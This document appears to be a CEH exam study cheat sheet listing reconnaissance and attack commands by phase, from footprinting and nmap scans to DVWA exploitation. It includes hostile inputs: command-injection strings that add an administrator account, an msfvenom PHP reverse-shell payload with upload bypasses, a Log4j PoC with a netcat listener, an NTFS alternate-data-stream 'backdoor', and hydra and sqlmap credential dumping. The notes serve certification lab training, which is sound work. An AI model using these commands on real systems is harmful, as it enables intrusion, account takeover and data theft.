# ceh Guide 
Footprinting
-Whois - https://www.whois.com/whois/ 
-Netcraft
-ipvoid. com
-PeekYou- web foot printing for personal info
-Ping command
-Know the ip address:Ping www.example.com
-Know the packet size before dropping -ping www.certifiedhacker.com -f -l 1472
-Photon:python3 photon.py -u http://www.certifiedhacker.com -l 3 -t 200 --wayback
-Web Data Extractor - emails and all
-grecon- subdomains, word press, login pages
-ARIN Whois  - helps to find the network range
-Centrlops
To get tools from windows: Ctrl+L >> smb://ip
Scanning
-Network scan(gui) - megaping, netsacntools pro
-Nmap:
  Full open : nmap -sT -v ip
  Aggressive: nmap -T4 -A ip
-Hping3:
  hping3 -A [Target IP Address] -p 80 -c 5
  hping3 --scan 0-100 -S [Target IP Address 
  hping3 -8 0-100 -S [Target IP Address] -V 
-Live hosts: nmap -sn -PE range
-To know which device is hosting a website : nmap -p 80,443 —script http-title ip-range
Enumeration
-NetBIOS:
 -Windows:
  nbtstat -a [IP address]
  nbtstat -c
  net use
-Linux:
  nmap -sV -v --script nbstat.nse [Target IP Address]
  nmap -sU -p 137 --script nbstat.nse [Target IP Address]
-SNMP
 snmp-check [Target IP Address]
 Softperfect networkscanner- gui : helps to find hostnames
 snmpwalk -v1 -c public [target IP]
 snmpwalk -v2c -c public [Target IP Address]
 nmap -sU -p 161 --script=snmp-sysdescr [target IP Address]
 nmap -sU -p 161 --script=snmp-processes [target IP Address]
 nmap -sU -p 161 --script=snmp-win32-software [target IP Address]
 Nmap-sU -p 161 --script=snmp-interfaces [target IP Address]
-LDAP:
 AD Explorer-GUI
 ldapsearch -h [Target IP Address] -x -s base namingcontexts 
 ldapsearch -h [Target IP Address] -x -b "DC=CEH,DC=com"
 ldapsearch -x -h [Target IP Address] -b "DC=CEH,DC=com" "objectclass=*" 
-NFS:
 Superenum : ./superenum
 python3 rpc-scan.py [Target IP address] --rpc
-DNS:
 dig ns [Target Domain]
 dig @[[NameServer]] [[Target Domain]] axfr
-To find responsible mail address : in windows >> nslookup >> set type=soa >> target domain
-./dnsrecon.py -d [Target domain] -z
-nmap --script=broadcast-dns-service-discovery [Target Domain] 
-SMTP
 nmap -p 25 --script=smtp-enum-users [Target IP Address] 
 nmap -p 25 --script=smtp-open-relay [Target IP Address] 
 nmap -p 25 --script=smtp-commands [Target IP Address]
Vulnerability Analysis
-OpenVAS
-Nessus
-Nikto 
 nikto -h (Target Website) -Tuning x
 nikto -h (Target Website) -Cgidirs all
System Hacking:
-Responder -I eth0
-L0pht crack
-Hiding files using NTFS: type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
 mklink backdoor.exe readme.txt:calc.exe
 backdoor.exe : opens the hidden calc app
-Steganography
 White Space steganography : snow-snow -C -p "magic" readme2.txt
 Openstego
  https://stegonline.georgeom.net/upload
Malware Analysis
-Static:
-BinText - Strings search
-Detect It Easy (DIE) - ELF files
-PE Explorer - Portable executable (PE) information 
-Ghidra - malware disassembly
-Dynamic
-TCPView - port monitoring 
-Reg Organizer - registry monitoring
Sniffing
-Wireshark - password sniffing - http.request.method == POST
-Mac changing in linux -macchanger -a eth0
-Cain and Abel -Detect ARP poisoning and promiscuous mode
-nmap --script=sniffer-detect [Target IP Address
Social Engineering 
-setoolkit , net craft extension
DOS
-Anti DDoS Guardian
Session Hijacking: ZAP, bettercap
Web servers Hacking
-Whois : python3 ghost_eye.py
-Reconniacanse : httprecon GUI
-Nectat - nc -vv www.moviescope.com 80
-Telnet - telnet www.moviescope.com 80 >> GET / HTTP/1.0
-Enumeration: nmap -sV --script=http-enum [target website]
-HOSTNAME - nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.example.com
-Http trace - nmap --script http-trace -d www.example.com
-Firewall - nmap -sV —script http-waf-detect target 
Unison:
-Directories - uniscan -u http://url -q
-File check - uniscan -u http://url -we
-Dynamic - uniscan -u http://url -d
-Brute Force- hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address]
Web Application Hacking
-whatweb -v [Target]
-whatweb --log-verbose=Report TARGET.COM
-Load balancers: dig yahoo.com >>> lbd yahoo.com
-Directories: gobuster dir -u [Target Website] -w /home/attacker/Desktop/common.txt
-python3 dirsearch.py -u http://www.moviescope.com
-Detect clickjacking - ClickjackPoc
-Wordpress login site - wp-login.php?
-Identify XSS - PwnXSS : python3 pwnxss.py -u http://example
-Identify Content management system : wig www.cehorg.com
-Brute forcing : wpscan
 -wpscan --api-token [API Token] --url http://example --enumerate u 
 -wpscan --url http://cehorg.com/wp-login.php -U <username.txt> -P <password.txt>
-Command injection in dvwa:
 -Hostname : | hostname
 -System info : | whoami
 -to view a file : | type
 -Running processes: | tasklist,
 -Kill a task: | Taskkill /PID /F
 -Directory structure: | dir C:\
 -Add a user: | net user Test /Add
 -Grant admin privileges: | net localgroup Administrators Test /Add (after successfully adding the user you can get rdp to the device)
 -Check users : | net user
-File upload vulnerability:
 -Create payload and paste t to upload.php file: msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw
 -Upload the file to dvwa and note the location
 Msfconsole
 -Use exploit/multi/handler
 -Set options
 -Use payload php/meterpreter/reverse_tcp
 -Run
 -Go to the upload path and you get shell access
 -Medium: save it as .jpg and when clicking upload intercept the traffic in burpsuite and change the file name
 -High: save the file with first line as gif98 and save as .jpeg and upload after that go to command injection and |copy .jpeg path to .php
Log4j:
 -tar -xf jdk-8u202-linux-x64.tar.gz
 -mv jdk1.8.0_202 /usr/bin/
 -pluma poc.py change line 62,87,99 with /usr/bin/jdk1.8.0_202/bin/java
 -In new terminal nc -lvp 9001
 -python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
 -Copy the payload and paste in login form you get access.
SQL injection
Sqlmap : 
 -sqlmap -u "http://www.example.com/viewprofile.aspx?id=1" --cookie="[cookie value]" --dbs 
 -sqlmap -u "http://www.example.com/viewprofile.aspx?id=1" --cookie="[cookie value]" -D moviescope --tables 
 -sqlmap -u "http://www.example.com/viewprofile.aspx?id=1" --cookie="[cookie value]" -D moviescope -T User_Login --dump
 -To get os shell : --os-shell
DSSS:
 -python3 dsss.py -u "http://www.example.com/viewprofile.aspx?id=1" --cookie="[cookie value]
Hacking Wireless Networks :
 -WEP-aircrack-ng ‘path to .cap file’
 -WPA2- aircrack-ng -a2 -b [Target BSSID] -w ‘wordlist path’ ‘packet path’
Hacking Mobile Platforms :
 -Phonesploit -python3 phonesploit.py
 -Analyze malicious app in a phone - https://www.sisik.eu/apk-tool 
IOT Hacking:
 -Shodan
 -MQTT -1883
Cryptography
-HashCalc
-MD5 hash
-BCTextEncoder
-Veracrypt
-Cryptanalysis: CrypTool,  alphapeeler
